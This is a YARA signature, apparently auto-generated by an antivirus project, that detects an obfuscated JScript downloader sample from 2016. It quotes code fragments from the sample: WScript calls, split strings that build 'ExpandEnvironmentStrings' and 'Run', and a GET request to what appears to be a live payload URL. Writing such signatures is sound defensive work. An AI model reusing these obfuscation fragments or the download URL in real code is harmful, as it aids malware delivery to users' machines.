rule sig_20160428_ae2ba8e05cf88a0334b41ab791d30aa3 {
  meta:
    description = "datamaliciousorder - file 20160428_ae2ba8e05cf88a0334b41ab791d30aa3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dcd41d25c9933f9fdce848de54db77ff2213db9e5f958af70587efb8a310064b"

  strings:
    $s1  = "function GmdLevEuvNkiQygIsdUol() {return RtmGitSimOqyAzlVxxTnr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function UmqLvxGfxDbnIboQedEnc(ZpbTpaHfiSldGamJzhUcf){RtmGitSimOqyAzlVxxTnr[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function UmqLvxGfxDbnIboQedEnc(ZpbTpaHfiSldGamJzhUcf){RtmGitSimOqyAzlVxxTnr[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var RtmGitSimOqyAzlVxxTnr = function WrtCynEfoJjgKxtZndJfw() {return WphLsqVbgOzdTjiUoxBwj[RazOjlVtqIkaVhtSdxVpl](\"WScript\"+\"" ascii
    $s5  = "return GxfJhwVccHylCyrAvoVes - TtzCzfSevYjsHagRdpElj;};" fullword ascii
    $s6  = "function HxeCdxBcdFouPvlMqtXoe(GxfJhwVccHylCyrAvoVes, TtzCzfSevYjsHagRdpElj){BeoWtiYbfUbyAduQaaUtv = BeoWtiYbfUbyAduQaaUtv * 1; " ascii
    $s7  = "var RtmGitSimOqyAzlVxxTnr = function WrtCynEfoJjgKxtZndJfw() {return WphLsqVbgOzdTjiUoxBwj[RazOjlVtqIkaVhtSdxVpl](\"WScript\"+\"" ascii
    $s8  = "var WphLsqVbgOzdTjiUoxBwj = this[\"WScript\"];" fullword ascii
    $s9  = "function GmdLevEuvNkiQygIsdUol() {return RtmGitSimOqyAzlVxxTnr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "if (GolFxxWznKakLmuDsdDgw[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s11 = "function HxeCdxBcdFouPvlMqtXoe(GxfJhwVccHylCyrAvoVes, TtzCzfSevYjsHagRdpElj){BeoWtiYbfUbyAduQaaUtv = BeoWtiYbfUbyAduQaaUtv * 1; " ascii
    $s12 = "function RoxJpcRpzHgnFbvBkvSsq(){return RplTnyVpvMtiDvqRffElj + \"\";};" fullword ascii
    $s13 = "function RuqIbqPsrXtmFocFowKbo() {return ((PumHowBgxZkpEmsYraJko == true) && (PumHowBgxZkpEmsYraJko == EgtRuaAjhVadOcfFbpGoi)) ?" ascii
    $s14 = "GolFxxWznKakLmuDsdDgw[HcrKtkLnzUzyTebNuvHln](\"G\" + \"ET\", \"http://tribalsnedkeren.dk/n4jca\", false);" fullword ascii
    $s15 = "function RuqIbqPsrXtmFocFowKbo() {return ((PumHowBgxZkpEmsYraJko == true) && (PumHowBgxZkpEmsYraJko == EgtRuaAjhVadOcfFbpGoi)) ?" ascii
    $s16 = "function JkkSvwUjrFwaIeyYwyKhe(FahUxqEqxPlxPjmKatGdx) {var TbtAwoKkyZjuDvrOsrLkx = (1, 2, 3, 4, 5, FahUxqEqxPlxPjmKatGdx); retur" ascii
    $s17 = "EgtRuaAjhVadOcfFbpGoi = true; " fullword ascii
    $s18 = "AtsWdqMauYqrPvjHjkIwm = true;" fullword ascii
    $s19 = "var AtsWdqMauYqrPvjHjkIwm = false;" fullword ascii
    $s20 = "function JkkSvwUjrFwaIeyYwyKhe(FahUxqEqxPlxPjmKatGdx) {var TbtAwoKkyZjuDvrOsrLkx = (1, 2, 3, 4, 5, FahUxqEqxPlxPjmKatGdx); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}